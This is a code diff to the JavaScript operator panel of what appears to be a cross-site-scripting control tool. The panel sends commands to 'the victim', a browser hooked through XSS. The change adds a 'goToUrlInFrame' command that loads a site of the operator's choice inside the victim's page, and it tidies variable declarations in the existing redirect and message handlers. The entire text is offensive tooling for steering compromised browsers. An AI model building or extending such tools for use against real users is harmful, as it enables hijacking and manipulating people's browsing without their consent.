@@ -50,10 +50,11 @@ $(function () {
     });
 
     $('.function').click(function () {
+        var sure;
         var dataAttr = $(this).attr('data-function');
         var send = true;
         var value;
-        var result
+        var result;
 
         if (dataAttr == 'msg') {
             result = prompt('What would you like to send?', 'XSS');
@@ -76,7 +77,19 @@ $(function () {
         } else if (dataAttr == 'goToUrl') {
             result = prompt('Which url you want the victim to visit?', 'http://google.com');
             if (result) {
-                var sure = confirm('Are you sure? You will lose the victim');
+                sure = confirm('Are you sure? You will lose the victim');
+                if (sure) {
+                    value = result;
+                } else {
+                    send = false;
+                }
+            } else {
+                send = false;
+            }
+        } else if (dataAttr == 'goToUrlInFrame') {
+            result = prompt('Which url you want the victim to visit?', 'http://google.com');
+            if (result) {
+                sure = confirm('Are you sure this site is embeddable?, check before launching!');
                 if (sure) {
                     value = result;
                 } else {
@@ -86,6 +99,7 @@ $(function () {
                 send = false;
             }
         }
+
 
         if (send) {
             var data = '{"id": "' + id + '", "date": "' + getTime() + '", "type": "' + dataAttr + '", "metaData": "'
